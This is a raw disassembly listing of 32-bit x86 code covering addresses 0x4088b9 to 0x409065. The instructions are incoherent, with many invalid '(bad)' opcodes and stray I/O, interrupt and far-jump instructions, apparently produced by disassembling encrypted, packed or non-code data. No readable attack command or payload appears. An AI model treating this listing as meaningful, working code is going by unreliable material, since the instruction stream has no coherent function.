  4088b9:	jmp    0xec74:0x5371aeb9
  4088c0:	iret   
  4088c1:	popf   
  4088c2:	xor    BYTE PTR [ebx+0x61],ah
  4088c5:	pushf  
  4088c6:	mov    BYTE PTR [ebx+ebp*2+0xc],0x3b
  4088cb:	addr16 xchg edi,eax
  4088cd:	test   esp,0x99c4eb4f
  4088d3:	add    DWORD PTR [eax],ecx
  4088d5:	enter  0x8592,0xf5
  4088d9:	cmp    eax,0x8ff8b955
  4088de:	inc    ecx
  4088df:	call   0x132139c
  4088e4:	adc    al,0xf3
  4088e6:	sub    esp,DWORD PTR [edi]
  4088e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e9:	push   0xea99b8e1
  4088ee:	inc    ecx
  4088ef:	fstp   st(6)
  4088f1:	mov    ecx,0x9af91a81
  4088f6:	dec    ecx
  4088f7:	mov    edi,gs
  4088f9:	cmp    BYTE PTR [esi+0x68173ac5],bh
  4088ff:	cdq    
  408900:	lock adc dl,al
  408903:	hlt    
  408904:	lea    edx,[ecx]
  408906:	push   esi
  408907:	xchg   ecx,eax
  408908:	bound  ebp,QWORD PTR [edx+edx*4-0x525f17a]
  40890f:	cmp    dl,BYTE PTR [ecx]
  408911:	gs cmp al,0x18
  408914:	inc    ebp
  408915:	pop    esi
  408916:	mov    DWORD PTR [esi-0x2b8afa1d],ecx
  40891c:	dec    ecx
  40891d:	jns    0x4088ef
  40891f:	lods   eax,DWORD PTR ds:[esi]
  408920:	(bad)  [edi]
  408922:	test   eax,0xe477b615
  408927:	mov    ebp,edi
  408929:	dec    esi
  40892a:	aam    0x30
  40892c:	stos   DWORD PTR es:[edi],eax
  40892d:	je     0x4088b9
  40892f:	push   esp
  408930:	push   cs
  408931:	mov    ecx,0x40c8ce76
  408936:	cmp    ebp,DWORD PTR [ecx+0x7021678b]
  40893c:	fld    DWORD PTR [ebx]
  40893e:	mov    ah,0xfb
  408940:	sub    edi,eax
  408942:	add    bh,al
  408944:	sbb    bh,0xd3
  408947:	push   ss
  408948:	or     eax,0x9a36ac3a
  40894d:	push   edx
  40894e:	int    0x79
  408950:	jne    0x4088ef
  408952:	enter  0xef7f,0x85
  408956:	fcom   QWORD PTR [eax+0x11]
  408959:	jl     0x40897f
  40895b:	mov    edi,0xd7bf1fd9
  408960:	xchg   edi,eax
  408961:	push   ss
  408962:	mul    BYTE PTR [eax]
  408964:	test   al,0x4b
  408966:	xchg   esi,eax
  408967:	push   ss
  408968:	cmp    eax,0xf1e9819b
  40896d:	fstp   QWORD PTR [edx-0x31]
  408970:	xchg   ebp,esi
  408972:	mov    ?,WORD PTR [eax+0x5c]
  408975:	enter  0xf9fb,0x19
  408979:	into   
  40897a:	mov    esp,0xa5eb3f43
  40897f:	sub    eax,0xbdfbebaa
  408984:	cwde   
  408985:	mov    ds:0x76871dbb,al
  40898a:	js     0x408992
  40898c:	dec    ebp
  40898d:	out    dx,al
  40898e:	mov    esp,0x7eaa305
  408993:	pop    eax
  408994:	(bad)  
  408995:	pop    ebx
  408996:	xor    bl,bh
  408998:	mov    ds:0x554313da,al
  40899d:	dec    ebp
  40899e:	mov    eax,0x1f7113dd
  4089a3:	imul   ecx,DWORD PTR [esi+0x4268d61a],0x454b0e7d
  4089ad:	lods   eax,DWORD PTR ds:[esi]
  4089ae:	push   edi
  4089af:	repnz add dh,BYTE PTR [edi+0x20bef208]
  4089b6:	mov    ebp,0x9d4b04b
  4089bb:	inc    edx
  4089bc:	xchg   esp,eax
  4089bd:	and    al,BYTE PTR [eax+0x4c]
  4089c0:	dec    ecx
  4089c1:	mov    esp,0x9c0783c0
  4089c6:	ret    0x5687
  4089c9:	sar    DWORD PTR [edi+0x74],1
  4089cc:	stos   DWORD PTR es:[edi],eax
  4089cd:	inc    esp
  4089ce:	popa   
  4089cf:	addr16 ds mov ecx,0xc247fddf
  4089d6:	push   ebx
  4089d7:	inc    esi
  4089d8:	push   ebx
  4089d9:	mov    ebx,0x31b90cbe
  4089de:	push   ebp
  4089df:	std    
  4089e0:	mov    al,0x6c
  4089e2:	pop    ebp
  4089e3:	xchg   esi,eax
  4089e4:	scas   al,BYTE PTR es:[edi]
  4089e5:	fcmovu st,st(6)
  4089e7:	pop    ss
  4089e8:	aas    
  4089e9:	dec    ecx
  4089ea:	inc    esp
  4089eb:	mov    cs,WORD PTR [eax+0x54]
  4089ee:	data16 or al,0xf0
  4089f1:	lahf   
  4089f2:	jle    0x4089b2
  4089f4:	nop
  4089f5:	pop    eax
  4089f6:	xchg   esi,eax
  4089f7:	shr    DWORD PTR [ecx+edi*2+0x12869ab6],1
  4089fe:	sbb    al,0x60
  408a00:	jo     0x408a78
  408a02:	jge    0x4089f5
  408a04:	mov    DWORD PTR [ebx-0x52bf81c3],ebp
  408a0a:	cmp    bh,BYTE PTR [eax-0x48b101c6]
  408a10:	dec    esp
  408a11:	lahf   
  408a12:	xlat   BYTE PTR ds:[ebx]
  408a13:	sar    dh,0xac
  408a16:	(bad)  
  408a17:	int    0x27
  408a19:	xchg   DWORD PTR [ebp+esi*8+0x6a],ecx
  408a1d:	push   esp
  408a1e:	push   es
  408a1f:	fincstp 
  408a21:	rcr    BYTE PTR [eax],0x3a
  408a24:	push   esi
  408a25:	mov    dl,0xc7
  408a27:	loopne 0x4089f6
  408a29:	jo     0x408a07
  408a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2c:	push   ebp
  408a2d:	sar    eax,cl
  408a2f:	dec    dx
  408a31:	inc    ebp
  408a32:	cmc    
  408a33:	xchg   esp,eax
  408a34:	inc    eax
  408a35:	call   DWORD PTR [ebx+0x30bd5d4a]
  408a3b:	or     cl,ah
  408a3d:	cmp    esi,DWORD PTR [eax+eiz*8-0x5b721c09]
  408a44:	xlat   BYTE PTR ds:[ebx]
  408a45:	sti    
  408a46:	fwait
  408a47:	hlt    
  408a48:	push   es
  408a49:	pop    es
  408a4a:	cmp    BYTE PTR gs:[esi-0x19],al
  408a4e:	cmp    dh,bl
  408a50:	adc    BYTE PTR [edi+0x40add006],0x4a
  408a57:	push   cs
  408a58:	addr16 ss ss pop ss
  408a5c:	push   0x3f5eef52
  408a61:	ds inc esi
  408a63:	mov    ebp,esi
  408a65:	dec    esi
  408a66:	inc    eax
  408a67:	repz (bad) 
  408a69:	fwait
  408a6a:	dec    ecx
  408a6b:	dec    esi
  408a6c:	leave  
  408a6d:	(bad)  
  408a6f:	push   eax
  408a70:	jmp    FWORD PTR [edi+ebp*1]
  408a73:	lock popw es
  408a76:	lods   eax,DWORD PTR ds:[esi]
  408a77:	pop    ebx
  408a78:	mov    ?,WORD PTR [ebx-0x5c5694ea]
  408a7e:	gs int3 
  408a80:	xor    BYTE PTR [ebx+edi*4-0x3a],cl
  408a84:	leave  
  408a85:	out    0x5d,al
  408a87:	mov    ?,WORD PTR [edx-0x234ad0bd]
  408a8d:	out    dx,eax
  408a8e:	out    0x5d,eax
  408a90:	jecxz  0x408af6
  408a92:	adc    bh,BYTE PTR [esp+ecx*1-0x73a5cd9f]
  408a99:	mov    edi,0x2c637c1d
  408a9e:	mov    dl,0x57
  408aa0:	pop    esp
  408aa1:	push   0xffffffe2
  408aa3:	push   eax
  408aa4:	pop    ebx
  408aa5:	rcr    BYTE PTR [edx+0xa],0x60
  408aa9:	xchg   edx,eax
  408aaa:	sub    DWORD PTR [edx],esi
  408aac:	sbb    BYTE PTR [edi],dh
  408aae:	(bad)  
  408ab0:	sbb    ebx,DWORD PTR [edx]
  408ab2:	push   ebx
  408ab3:	sub    al,0xcf
  408ab5:	imul   ebx,DWORD PTR [esp+ebp*8],0xfffffff2
  408ab9:	aaa    
  408aba:	stos   BYTE PTR es:[edi],al
  408abb:	fidivr DWORD PTR [ebx+0x49]
  408abe:	xor    DWORD PTR [esi-0x2c],0xb1af866
  408ac5:	out    0x80,al
  408ac7:	jo     0x408aeb
  408ac9:	inc    eax
  408aca:	jmp    0x408ad9
  408acc:	dec    edi
  408acd:	add    BYTE PTR [esi-0x4660720b],dh
  408ad3:	out    dx,eax
  408ad4:	add    BYTE PTR [edx],dl
  408ad6:	and    BYTE PTR [eax+eax*1+0x3e],0xc2
  408adb:	mov    BYTE PTR [edx],cl
  408add:	add    ah,BYTE PTR [ecx-0x23f2e084]
  408ae3:	lods   al,BYTE PTR ds:[esi]
  408ae4:	imul   edi,DWORD PTR [edx+0x4986aa1d],0xffffffaf
  408aeb:	xor    al,0x74
  408aed:	enter  0x997e,0x52
  408af1:	push   edx
  408af2:	ins    DWORD PTR es:[edi],dx
  408af3:	cmp    cl,ah
  408af5:	inc    esp
  408af6:	(bad)  
  408af7:	pusha  
  408af8:	rcl    DWORD PTR [ebx-0x870f9a8],cl
  408afe:	xor    ecx,edx
  408b00:	jg     0x408b2d
  408b02:	bound  esp,QWORD PTR [edi+0x34]
  408b05:	dec    ebp
  408b06:	mov    edi,0xa58b44c1
  408b0b:	pusha  
  408b0c:	and    eax,0xbbe41178
  408b11:	call   0x7822:0x674b83ac
  408b18:	stc    
  408b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b1a:	imul   ebp,DWORD PTR ds:0xae340db4,0x383f0bad
  408b24:	dec    ebx
  408b25:	adc    DWORD PTR [esi-0x5c3c6d28],ebp
  408b2b:	in     al,dx
  408b2c:	xor    eax,0x6ab36cef
  408b31:	pop    es
  408b32:	dec    ebp
  408b33:	push   ds
  408b34:	ins    BYTE PTR es:[edi],dx
  408b35:	inc    esi
  408b36:	pop    ss
  408b37:	mov    ebp,0xd5372821
  408b3c:	mov    BYTE PTR [edi+0x1c],dh
  408b3f:	xchg   DWORD PTR [eax+0x1e],esi
  408b42:	mov    DWORD PTR [esi],ebx
  408b44:	test   DWORD PTR [ecx-0x8],ebx
  408b47:	mov    ebp,0x5f898685
  408b4c:	mov    WORD PTR [edi+0x2e07d3c6],es
  408b52:	xchg   esi,eax
  408b53:	cld    
  408b54:	out    0x11,al
  408b56:	xor    al,0x7
  408b58:	ins    DWORD PTR es:[edi],dx
  408b59:	cld    
  408b5a:	fild   WORD PTR [ecx-0x1f]
  408b5d:	cmp    dh,BYTE PTR [eax+0x470de0b5]
  408b63:	and    DWORD PTR [ebx+0x7fde1b92],edx
  408b69:	mov    ch,0x7b
  408b6b:	mov    ds:0xb3213837,al
  408b70:	out    0xf9,eax
  408b72:	imul   edi,DWORD PTR [ecx],0xd1d46b91
  408b78:	jbe    0x408b94
  408b7a:	push   edx
  408b7b:	dec    ecx
  408b7c:	push   edi
  408b7d:	push   0x37b47409
  408b82:	fwait
  408b83:	push   esp
  408b84:	xchg   ebp,eax
  408b85:	aad    0x40
  408b87:	add    eax,0xe0fd53c3
  408b8c:	jne    0x408b20
  408b8e:	mov    ecx,0x49b69789
  408b93:	sbb    bh,BYTE PTR [esi]
  408b95:	pushf  
  408b96:	xchg   ecx,eax
  408b97:	je     0x408b1e
  408b99:	adc    DWORD PTR [esi],0xffffffb4
  408b9c:	jae    0x408b3d
  408b9e:	ss xchg esi,eax
  408ba0:	loope  0x408b4c
  408ba2:	jbe    0x408b5a
  408ba4:	mov    ah,0xf0
  408ba6:	stos   BYTE PTR es:[edi],al
  408ba7:	jbe    0x408b62
  408ba9:	inc    esp
  408baa:	jmp    0xf4c1:0x57734041
  408bb1:	or     al,0xb5
  408bb3:	ret    
  408bb4:	jnp    0x408bbb
  408bb6:	stos   DWORD PTR es:[edi],eax
  408bb7:	sub    BYTE PTR [ecx],bh
  408bb9:	repnz iret 
  408bbb:	mov    eax,ds:0x49ae3ff1
  408bc0:	cmp    edx,DWORD PTR [ecx]
  408bc2:	mov    edx,0xce8450ef
  408bc7:	push   esp
  408bc8:	xchg   edx,eax
  408bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bca:	test   DWORD PTR [ecx+edi*2],esi
  408bcd:	push   cs
  408bce:	jge    0x408b90
  408bd0:	rol    cl,1
  408bd2:	pop    eax
  408bd3:	test   eax,0x606d39f4
  408bd8:	lea    eax,[edx]
  408bda:	xor    al,0x81
  408bdc:	(bad)  
  408bdd:	aaa    
  408bde:	iret   
  408bdf:	xor    DWORD PTR [ecx-0x7e73be8f],0xdfaf9de9
  408be9:	leave  
  408bea:	adc    eax,0xbe4f0134
  408bef:	cmp    BYTE PTR [edx+0x23],bl
  408bf2:	inc    esp
  408bf3:	call   0xb9a6eab5
  408bf8:	or     ch,cl
  408bfa:	cmp    al,0xe6
  408bfc:	jno    0x408c3a
  408bfe:	ins    DWORD PTR es:[edi],dx
  408bff:	pop    eax
  408c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c01:	test   eax,0x8719531a
  408c06:	xchg   ecx,eax
  408c07:	pop    edx
  408c08:	lahf   
  408c09:	mov    bh,BYTE PTR [esi+ebx*8+0x3564374c]
  408c10:	push   0x32
  408c12:	cmp    BYTE PTR [ebp+0x61],cl
  408c15:	xchg   edi,eax
  408c16:	cwde   
  408c17:	push   edi
  408c18:	(bad)  
  408c19:	xchg   ebx,eax
  408c1a:	adc    ebx,DWORD PTR [edx+0xf]
  408c1d:	jno    0x408be7
  408c1f:	push   ecx
  408c20:	cmc    
  408c21:	dec    esp
  408c22:	repz mov bh,0x19
  408c25:	pusha  
  408c26:	mov    BYTE PTR [esi-0x6b],dl
  408c29:	test   eax,0x8048fce7
  408c2e:	lds    edi,FWORD PTR ds:0x20992a88
  408c34:	enter  0x2794,0x4d
  408c38:	jbe    0x408c42
  408c3a:	repz mov dh,0xeb
  408c3d:	stos   BYTE PTR es:[edi],al
  408c3e:	or     bl,BYTE PTR [esi-0x62]
  408c41:	push   ds
  408c42:	dec    edx
  408c43:	mov    eax,0x3d6a8db9
  408c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c49:	push   0x11
  408c4b:	sbb    DWORD PTR [ebx-0x5a0890e1],esp
  408c51:	inc    ebx
  408c52:	pop    ebp
  408c53:	mov    ah,dl
  408c55:	nop
  408c56:	and    edx,DWORD PTR [edi-0x620ac371]
  408c5c:	mov    al,0x5e
  408c5e:	mul    BYTE PTR [ecx-0x50]
  408c61:	test   eax,0x7e3c1648
  408c66:	(bad)  
  408c67:	pop    ecx
  408c68:	adc    BYTE PTR [edi-0x38],dh
  408c6b:	and    ecx,DWORD PTR [edx+ecx*2]
  408c6e:	sub    DWORD PTR [eax-0x62fe9c42],edi
  408c74:	inc    ebp
  408c75:	aaa    
  408c76:	(bad)  
  408c77:	cli    
  408c78:	cld    
  408c79:	lock and al,0x4
  408c7c:	push   eax
  408c7d:	mov    ch,BYTE PTR [esp+edx*8-0x34]
  408c81:	inc    ecx
  408c82:	lds    edi,FWORD PTR [edx+ecx*1]
  408c85:	leave  
  408c86:	sti    
  408c87:	xor    eax,0xa203417a
  408c8c:	mov    al,0xf
  408c8e:	int3   
  408c8f:	in     al,dx
  408c90:	xor    DWORD PTR [ecx+0x22823fc9],ecx
  408c96:	das    
  408c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c98:	fs into 
  408c9a:	stc    
  408c9b:	test   al,0xc5
  408c9d:	and    edi,DWORD PTR [eax+ebp*8-0x646263ed]
  408ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ca5:	out    0x13,eax
  408ca7:	in     al,dx
  408ca8:	inc    eax
  408ca9:	stos   BYTE PTR es:[edi],al
  408caa:	(bad)  
  408cab:	retf   0x2490
  408cae:	test   DWORD PTR [ecx-0x6c],esi
  408cb1:	jno    0x408cd6
  408cb3:	xlat   BYTE PTR ds:[ebx]
  408cb4:	or     edi,DWORD PTR [ecx-0xfb782ae]
  408cba:	and    DWORD PTR [eax],esi
  408cbc:	pop    eax
  408cbd:	add    ecx,eax
  408cbf:	fmul   QWORD PTR [ebx+0x1]
  408cc2:	sahf   
  408cc3:	mov    eax,0x5bb52601
  408cc8:	nop
  408cc9:	(bad)  
  408ccb:	jg     0x408c8c
  408ccd:	xchg   ebx,eax
  408cce:	in     eax,0xf8
  408cd0:	cli    
  408cd1:	xchg   DWORD PTR [ebp-0x7fe95005],ebp
  408cd7:	sub    ebx,DWORD PTR [esi+0x2e6a6edf]
  408cdd:	add    DWORD PTR [ecx],edx
  408cdf:	add    al,0xc8
  408ce1:	aam    0x86
  408ce3:	in     al,0x78
  408ce5:	cwde   
  408ce6:	test   BYTE PTR [ecx],dl
  408ce8:	iret   
  408ce9:	mov    ?,WORD PTR [ebx+ebx*4+0x5431cd78]
  408cf0:	sub    BYTE PTR [ebx-0x58],bl
  408cf3:	xchg   DWORD PTR [eax+0x1a],esp
  408cf6:	adc    ebx,DWORD PTR [edx-0x36]
  408cf9:	xor    al,0x38
  408cfb:	inc    ecx
  408cfc:	pop    ebp
  408cfd:	js     0x408d65
  408cff:	rol    DWORD PTR [edx],1
  408d01:	or     esp,DWORD PTR ds:0xc1e478fc
  408d07:	pusha  
  408d08:	in     eax,dx
  408d09:	arpl   di,si
  408d0b:	xchg   ebp,eax
  408d0c:	mov    DWORD PTR [edi+eiz*1+0x5f125283],ebp
  408d13:	loop   0x408cf4
  408d15:	cmp    eax,edx
  408d17:	push   ecx
  408d18:	repz xchg esp,eax
  408d1a:	xchg   ebx,eax
  408d1b:	sub    DWORD PTR es:[edx],eax
  408d1e:	xlat   BYTE PTR ds:[ebx]
  408d1f:	sub    bh,ch
  408d21:	in     al,dx
  408d22:	dec    edi
  408d23:	in     eax,0x96
  408d25:	xchg   esp,eax
  408d26:	call   FWORD PTR [edx-0x6]
  408d29:	jo     0x408cf9
  408d2b:	pusha  
  408d2c:	data16 mov ah,0x42
  408d2f:	not    DWORD PTR [eax+0x55aa1d10]
  408d35:	pop    ebx
  408d36:	xor    eax,0x38093516
  408d3b:	and    BYTE PTR [ebx],0x86
  408d3e:	in     eax,0xbe
  408d40:	add    DWORD PTR [ebp-0x13],edi
  408d43:	retf   
  408d44:	sub    ebx,DWORD PTR [ecx]
  408d46:	bnd jae 0x408cee
  408d49:	retf   0xe519
  408d4c:	enter  0x1bc6,0x2e
  408d50:	popa   
  408d51:	xor    edx,ecx
  408d53:	ja     0x408d19
  408d55:	adc    al,0x66
  408d57:	pop    ebp
  408d58:	scas   eax,DWORD PTR es:[edi]
  408d59:	gs jmp 0x779f:0xcf7d71f2
  408d61:	imul   ebp,DWORD PTR [ebx],0xffffff87
  408d64:	cmp    eax,0xf923a9ed
  408d69:	push   ss
  408d6a:	push   edi
  408d6b:	push   eax
  408d6c:	and    esp,edi
  408d6e:	xchg   ebx,ecx
  408d70:	adc    DWORD PTR [eax],esi
  408d72:	aad    0x24
  408d74:	fisttp QWORD PTR [esi]
  408d76:	or     eax,0xb787fd9f
  408d7b:	inc    edx
  408d7c:	sbb    DWORD PTR [ebx-0x2680d1d9],0xa77dc631
  408d86:	inc    ebp
  408d87:	xor    bl,al
  408d89:	sbb    al,0x88
  408d8b:	sbb    dh,ah
  408d8d:	lods   al,BYTE PTR ds:[esi]
  408d8e:	dec    eax
  408d8f:	jnp    0x408dbd
  408d91:	mov    ds:0x353e5519,al
  408d96:	mov    dh,0x96
  408d98:	sbb    eax,0xd168ac57
  408d9d:	dec    eax
  408d9e:	out    0xbb,eax
  408da0:	stos   DWORD PTR es:[edi],eax
  408da1:	mov    ah,0xc7
  408da3:	(bad)  
  408da4:	outs   dx,DWORD PTR ds:[esi]
  408da5:	hlt    
  408da6:	mov    ecx,0xe6c69870
  408dab:	cld    
  408dac:	cmp    al,0xd2
  408dae:	das    
  408daf:	repnz leave 
  408db1:	or     al,0xf8
  408db3:	fld    DWORD PTR [edi+0x113bd6d9]
  408db9:	dec    ebp
  408dba:	dec    esi
  408dbb:	aad    0xf7
  408dbd:	fnstsw WORD PTR [eax+0x3ae54d5]
  408dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dc4:	jmp    DWORD PTR [esi]
  408dc6:	lock (bad) 
  408dc9:	sbb    edx,DWORD PTR [edx+0x4bd6a862]
  408dcf:	add    BYTE PTR [ebx],dh
  408dd1:	stc    
  408dd2:	rcr    ah,0x55
  408dd5:	lods   eax,DWORD PTR ds:[esi]
  408dd6:	lock jle 0x408dde
  408dd9:	(bad)  
  408dda:	adc    BYTE PTR [eax+0x5ee85573],dl
  408de0:	jb     0x408dba
  408de2:	mov    edi,0xe2cd63a7
  408de7:	cs out 0xda,eax
  408dea:	jge    0x408e4e
  408dec:	repnz mov DWORD PTR [ecx-0x43a2c5e1],ecx
  408df3:	xchg   esi,eax
  408df4:	cli    
  408df5:	imul   esp,DWORD PTR [edi],0x4c
  408df8:	aam    0x91
  408dfa:	dec    ebp
  408dfb:	cmp    al,0xa1
  408dfd:	arpl   WORD PTR [edx],bx
  408dff:	sbb    ch,bh
  408e01:	add    al,BYTE PTR [ecx-0x2c056624]
  408e07:	cmp    ebp,ebx
  408e09:	outs   dx,DWORD PTR ds:[esi]
  408e0a:	cmp    al,0x6a
  408e0c:	mov    esi,0xf77c257b
  408e11:	lds    eax,FWORD PTR [edx+0x29]
  408e14:	ins    DWORD PTR es:[edi],dx
  408e15:	or     eax,0x2f811a31
  408e1a:	push   0x65
  408e1c:	and    bl,bl
  408e1e:	adc    al,0x3e
  408e20:	in     al,dx
  408e21:	push   es
  408e22:	pop    esp
  408e23:	cwde   
  408e24:	out    dx,eax
  408e25:	dec    esi
  408e26:	fcom   st(7)
  408e28:	aas    
  408e29:	push   0x39
  408e2b:	test   DWORD PTR [esp+ecx*1+0x105ccfdf],eax
  408e32:	adc    DWORD PTR [esi-0x7505bd9d],ebx
  408e38:	mov    bh,0xfe
  408e3a:	pop    esi
  408e3b:	rcl    dl,0x8c
  408e3e:	sub    eax,DWORD PTR [ebx-0x64f7b7ff]
  408e44:	mov    al,ds:0x1fdc087
  408e49:	das    
  408e4a:	ror    dl,0x6b
  408e4d:	mov    DWORD PTR [edx+0x5fea9a0f],ecx
  408e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e54:	sbb    BYTE PTR [esi+0x25],0x4a
  408e58:	pop    eax
  408e59:	mov    es,WORD PTR [esi+0x6c]
  408e5c:	xchg   ebp,eax
  408e5d:	adc    dl,BYTE PTR [ecx]
  408e5f:	mov    ebx,0x351e0132
  408e64:	leave  
  408e65:	sahf   
  408e66:	inc    ebx
  408e67:	mov    bh,0x14
  408e69:	sbb    ch,BYTE PTR [ebx-0x3aab8446]
  408e6f:	and    ebx,0x72fb7470
  408e75:	push   cs
  408e76:	inc    edi
  408e77:	popf   
  408e78:	arpl   WORD PTR [edx-0x247ef032],bp
  408e7e:	mov    cl,bh
  408e80:	jmp    0x2e150b46
  408e85:	gs push ebp
  408e87:	bound  edx,QWORD PTR [ecx]
  408e89:	jmp    0x1b798486
  408e8e:	retf   
  408e8f:	shl    DWORD PTR [eax],1
  408e91:	jb     0x408edf
  408e93:	(bad)  
  408e94:	lahf   
  408e95:	push   0xd38dbfd1
  408e9a:	inc    ecx
  408e9b:	ret    
  408e9c:	mov    esp,DWORD PTR [ebx-0x72]
  408e9f:	pop    esp
  408ea0:	scas   eax,DWORD PTR es:[edi]
  408ea1:	pop    eax
  408ea2:	sbb    BYTE PTR [edx],bl
  408ea4:	sbb    al,0x6e
  408ea6:	pop    ebx
  408ea7:	mov    ah,0x8b
  408ea9:	loop   0x408e55
  408eab:	sub    DWORD PTR ds:0x980e5853,edx
  408eb1:	ret    
  408eb2:	iret   
  408eb3:	fs pop ss
  408eb5:	pusha  
  408eb6:	lock mov cs,WORD PTR [ecx-0x7f118bec]
  408ebd:	rcr    ebp,0x15
  408ec0:	xchg   ebx,eax
  408ec1:	mov    eax,0x598fb188
  408ec6:	retf   0xd6e3
  408ec9:	inc    edx
  408eca:	icebp  
  408ecb:	jl     0x408ebd
  408ecd:	mov    al,0xc6
  408ecf:	mov    ebp,0x622dc778
  408ed4:	loop   0x408e97
  408ed6:	jecxz  0x408f3d
  408ed8:	push   eax
  408ed9:	ret    
  408eda:	or     eax,DWORD PTR [ecx+0x134c6c50]
  408ee0:	pop    esi
  408ee1:	pop    es
  408ee2:	push   edi
  408ee3:	and    cl,BYTE PTR [edi]
  408ee5:	(bad)  
  408ee6:	gs and esi,0xffffffd2
  408eea:	jb     0x408e80
  408eec:	lods   eax,DWORD PTR ds:[esi]
  408eed:	sahf   
  408eee:	hlt    
  408eef:	jmp    0x890312f
  408ef4:	shr    BYTE PTR [edi+edx*1+0x53bcb7d5],1
  408efb:	(bad)  
  408efc:	retf   0xe47
  408eff:	add    eax,0xbf74f06b
  408f04:	xchg   ebp,eax
  408f05:	and    eax,0xd4dd15c0
  408f0a:	push   eax
  408f0b:	xchg   BYTE PTR [ecx],bh
  408f0d:	or     BYTE PTR [ebx],0x86
  408f10:	and    DWORD PTR [esi+0x786aa090],ecx
  408f16:	pop    ebx
  408f17:	gs hlt 
  408f19:	dec    ecx
  408f1a:	push   ecx
  408f1b:	pop    ecx
  408f1c:	or     DWORD PTR [ebx],0x2b
  408f1f:	stc    
  408f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f21:	mov    al,ds:0x1b2b9ca2
  408f26:	iret   
  408f27:	xor    eax,DWORD PTR [edi+0x9]
  408f2a:	test   DWORD PTR [esi-0x7fbe3600],0x11c6b5d6
  408f34:	pusha  
  408f35:	loope  0x408f40
  408f37:	sub    ebx,DWORD PTR [edx+ecx*1]
  408f3a:	pop    es
  408f3b:	stc    
  408f3c:	push   0xffffff9c
  408f3e:	inc    eax
  408f3f:	adc    BYTE PTR [ecx+0x5a1b2b3d],0x45
  408f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f47:	addr16 mov ebx,0x8130ff31
  408f4d:	dec    esp
  408f4e:	je     0x408f03
  408f50:	inc    eax
  408f51:	mov    edx,0x2b0907ff
  408f56:	lahf   
  408f57:	cmp    esp,DWORD PTR [ebx-0x6e]
  408f5a:	push   ebp
  408f5b:	inc    esi
  408f5c:	cli    
  408f5d:	aaa    
  408f5e:	push   ecx
  408f5f:	sbb    al,0xcf
  408f61:	test   eax,0xc9bf708d
  408f66:	sub    eax,0x7a5c601f
  408f6b:	imul   esi,DWORD PTR ds:0x8c34bfdf,0xffffff95
  408f72:	retf   
  408f73:	jbe    0x408f13
  408f75:	scas   eax,DWORD PTR es:[edi]
  408f76:	das    
  408f77:	call   DWORD PTR [eax]
  408f79:	ins    BYTE PTR es:[edi],dx
  408f7a:	sub    DWORD PTR [ebp-0x580a86c],edx
  408f80:	enter  0x2ee,0x51
  408f84:	mov    bh,0xc0
  408f86:	xchg   edx,eax
  408f87:	aas    
  408f88:	and    al,0x7d
  408f8a:	mov    cl,0x90
  408f8c:	push   esi
  408f8d:	fucom  st(4)
  408f8f:	rcr    BYTE PTR [ecx-0x4f],1
  408f92:	and    BYTE PTR [edx+0x72],bl
  408f95:	jns    0x408f67
  408f97:	out    0x50,al
  408f99:	mov    eax,0x1321ec19
  408f9e:	push   ds
  408f9f:	or     eax,0x6249537f
  408fa4:	add    eax,0x3a1e4943
  408fa9:	jno    0x408f9d
  408fab:	pop    edx
  408fac:	push   ecx
  408fad:	xor    eax,edx
  408faf:	xchg   edi,eax
  408fb0:	add    eax,DWORD PTR [esi]
  408fb2:	icebp  
  408fb3:	out    dx,al
  408fb4:	pop    ss
  408fb5:	jo     0x408ff5
  408fb7:	dec    ecx
  408fb8:	popa   
  408fb9:	sub    eax,0xffffff9f
  408fbc:	in     al,dx
  408fbd:	adc    bh,BYTE PTR [edi-0x1402ccaa]
  408fc3:	xchg   BYTE PTR [ecx+0x42],dh
  408fc6:	sub    eax,0xe90ce151
  408fcb:	adc    BYTE PTR [eax-0x524f8706],bl
  408fd1:	fldl2e 
  408fd3:	fsubr  DWORD PTR [ebx-0x6b08d0ca]
  408fd9:	add    DWORD PTR [ebp+0x70d8f233],ebp
  408fdf:	add    ecx,ecx
  408fe1:	rcr    DWORD PTR [ebx],0xb2
  408fe4:	sub    eax,0xf4d6b8d8
  408fe9:	push   esp
  408fea:	push   edx
  408feb:	clc    
  408fec:	adc    BYTE PTR [edi+0x39],0xf9
  408ff0:	mov    ds:0x64bbfbc,al
  408ff5:	mov    ecx,0x29ef62fc
  408ffa:	lahf   
  408ffb:	call   0x5b3d4fa
  409000:	shl    BYTE PTR [ebp+edx*8+0x4f],cl
  409004:	add    bl,cl
  409006:	xchg   esp,eax
  409007:	mov    ch,0x4
  409009:	and    BYTE PTR es:[eax+edx*1-0x1a],al
  40900e:	ja     0x409013
  409010:	cs test al,0xc9
  409013:	in     al,dx
  409014:	(bad)  
  409016:	dec    ebx
  409017:	or     cl,BYTE PTR [eax-0x18550fcd]
  40901d:	cwde   
  40901e:	repz mov eax,ds:0x6f0c5276
  409024:	bound  edi,QWORD PTR [esi+0x39cdfbfb]
  40902a:	xchg   esi,eax
  40902b:	or     eax,0x5b308fb4
  409030:	mov    bl,0xec
  409032:	push   ecx
  409033:	inc    esi
  409034:	xor    al,0x8d
  409036:	sub    bh,BYTE PTR [ebx+0x21]
  409039:	jns    0x4090ae
  40903b:	cmp    eax,0xb85ff701
  409040:	mov    ebx,0xf556b04d
  409045:	push   esp
  409046:	aaa    
  409047:	xchg   DWORD PTR [ebx-0x2b8e7a83],ecx
  40904d:	or     DWORD PTR [eax],0x6096532b
  409053:	inc    edx
  409054:	ror    BYTE PTR [ebx+edi*1],1
  409057:	add    edi,DWORD PTR [ebx-0x78]
  40905a:	outs   dx,BYTE PTR ds:[esi]
  40905b:	sbb    al,0xf0
  40905d:	cmc    
  40905e:	jo     0x409011
  409060:	and    edx,DWORD PTR [esi+0x5f]
  409063:	int3   
  409064:	outs   dx,BYTE PTR ds:[esi]
  409065:	jmp    0xbb4596d0
